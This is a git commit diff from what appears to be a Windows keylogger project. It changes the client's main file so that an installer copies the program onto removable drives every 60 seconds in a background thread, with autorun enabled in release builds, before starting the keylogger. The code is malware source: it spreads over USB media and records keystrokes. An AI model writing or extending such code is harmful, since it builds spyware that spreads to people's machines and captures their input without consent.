500997af0e13bcd56767a605813b5d061233fb15
EinBaum <mail@einbaum.org>
2015-01-11 03:36:02 +0100

    Removable drive installer in separate thread

--- Client/src/Main.cpp
+++ Client/src/Main.cpp
@@ -3,11 +3,18 @@
 #include "Settings.h"
 #include "Installer.h"
 
-
-TCHAR semName[] = V_UNIQUE_ID;
+DWORD WINAPI ProcInstall(LPVOID lpParameter)
+{
+	for (;;) {
+		installer.InstallOnDrives();
+		Sleep(60000);
+	}
+	return 0;
+}
 
 extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
 {
+	TCHAR semName[] = V_UNIQUE_ID;
 	HANDLE hSem = CreateSemaphore(NULL, 1, 1, semName);
 	if (WaitForSingleObject(hSem, 0) == WAIT_TIMEOUT)
 	{
@@ -20,7 +27,10 @@ extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
 #ifdef _DEBUG
 	installer.SetAutorun(false);
 #endif
-	installer.InstallOnDrives();
+
+	CreateThread(NULL, 16384, ProcInstall, NULL, 0, NULL);
+	
+
 	keylogger.Run();
 
 	CloseHandle(hSem);
